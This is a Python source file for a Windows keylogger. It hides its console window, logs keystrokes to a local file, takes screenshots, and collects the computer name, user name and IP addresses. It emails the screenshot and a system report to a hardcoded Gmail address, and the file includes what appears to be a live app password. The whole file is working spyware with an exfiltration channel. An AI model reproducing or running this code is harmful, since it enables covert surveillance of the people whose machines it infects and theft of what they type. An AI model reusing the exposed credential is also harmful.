import threading
import time
import os
import sys
from datetime import datetime
from pynput import keyboard
import yagmail
from PIL import ImageGrab
import socket
import requests
import psutil
import platform

# ========== EMAIL CONFIG ==========
EMAIL_ADDRESS = "haiderusama707@gmail.com"
EMAIL_PASSWORD = "ddzg ekqj mgve udlc"
RECEIVER_EMAIL = "haiderusama707@gmail.com"

# ========== GET IP ==========
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text if response.status_code == 200 else "Unknown"
    except:
        return "Unknown"

def get_local_ip():
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except:
        return "Unknown"

# ========== TAKE SCREENSHOT ==========
def take_screenshot():
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = f"screenshot_{timestamp}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path, "PNG")
        return screenshot_path
    except Exception as e:
        print(f"Screenshot error: {e}")
        return None

# ========== SEND EMAIL IMMEDIATELY ==========
def send_immediate_email():
    print("📧 Sending email...")
    
    try:
        # Create test log
        test_log = f"""
        KEYLOGGER TEST REPORT
        =====================
        Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        Computer: {os.environ.get('COMPUTERNAME', 'Unknown')}
        User: {os.environ.get('USERNAME', 'Unknown')}
        Public IP: {get_public_ip()}
        Local IP: {get_local_ip()}
        CPU: {psutil.cpu_percent()}%
        RAM: {psutil.virtual_memory().percent}%
        
        Status: Keylogger is running successfully!
        """
        
        # Take screenshot
        screenshot_path = take_screenshot()
        
        # Initialize email
        yag = yagmail.SMTP(EMAIL_ADDRESS, EMAIL_PASSWORD)
        
        # Subject
        subject = f"✅ KEYLOGGER ACTIVE - {os.environ.get('COMPUTERNAME', 'Unknown')} - {datetime.now().strftime('%H:%M:%S')}"
        
        # Prepare attachments
        attachments = []
        if screenshot_path and os.path.exists(screenshot_path):
            attachments.append(screenshot_path)
        
        # Send
        yag.send(
            to=RECEIVER_EMAIL,
            subject=subject,
            contents=test_log,
            attachments=attachments if attachments else None
        )
        
        yag.close()
        
        # Cleanup
        if screenshot_path and os.path.exists(screenshot_path):
            os.remove(screenshot_path)
        
        print("✅ EMAIL SENT SUCCESSFULLY!")
        print(f"📧 Check: {RECEIVER_EMAIL}")
        print(f"📁 Also check SPAM folder if not in Inbox")
        
        return True
        
    except Exception as e:
        print(f"❌ Email error: {e}")
        return False

# ========== KEY LOGGER ==========
log_buffer = ""
log_file = "logs.txt"

def write_to_file(content):
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(content)
        f.flush()

def on_press(key):
    global log_buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            log_buffer += key.char
        elif key == keyboard.Key.space:
            log_buffer += ' '
        elif key == keyboard.Key.enter:
            log_buffer += '\n'
            write_to_file(log_buffer)
            log_buffer = ""
    except:
        pass

def on_release(key):
    pass

def periodic_flush():
    while True:
        time.sleep(5)
        global log_buffer
        if log_buffer:
            write_to_file(log_buffer)
            log_buffer = ""

def hide_console():
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ========== MAIN ==========
if __name__ == "__main__":
    hide_console()
    
    # Start keylogger
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    
    # Start flush thread
    threading.Thread(target=periodic_flush, daemon=True).start()
    
    # Write initial log
    write_to_file(f"\n=== SESSION START: {datetime.now()} ===\n")
    
    print("Keylogger running...")
    
    # Wait 10 seconds then send immediate email
    print("Waiting 10 seconds before sending email...")
    time.sleep(10)
    
    # Send email
    send_immediate_email()
    
    # Keep running
    try:
        while True:
            time.sleep(60)
            # Send email every 30 minutes automatically
            if int(time.time()) % 1800 < 60:  # Every 30 minutes
                send_immediate_email()
                time.sleep(60)
    except KeyboardInterrupt:
        sys.exit(0)